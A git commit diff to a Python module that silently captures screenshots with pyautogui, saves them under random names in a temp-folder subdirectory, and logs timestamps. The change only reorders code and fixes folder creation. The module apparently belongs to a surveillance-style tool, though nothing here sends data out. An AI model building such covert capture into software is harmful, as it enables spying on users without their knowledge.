7397b0a50fee0f5b63e806f34837e3ed6bd51cee
MafiaBoy <96381965+Casanova5065@users.noreply.github.com>
2022-10-20 20:40:32 +0530

    Update module.scrshot.py

--- module.scrshot.py
+++ module.scrshot.py
@@ -8,16 +8,16 @@ from pyautogui import screenshot
 
 def takeScreenshot():
     try:
+        myScreenshot = screenshot()
         path_to_dir = tempfile.gettempdir() + "/screenshots"
         path_to_logfile = path_to_dir + "/screenshots.log"
         letters = string.ascii_lowercase
         name = ''.join(random.choice(letters) for i in range(10))
-
-        myScreenshot = screenshot()
-        myScreenshot.save(path_to_dir + "/" + name + '.png')
-        if not exists(path_to_dir):
+        
+        if os.path.exists(path_to_dir) == False:
             os.mkdir(path_to_dir)
             
+        myScreenshot.save(path_to_dir + "/" + name + '.png')
         # should be saved to temp dir
         with open(path_to_logfile, "a") as file:
             file.write(str(datetime.datetime.now()) + "\n")
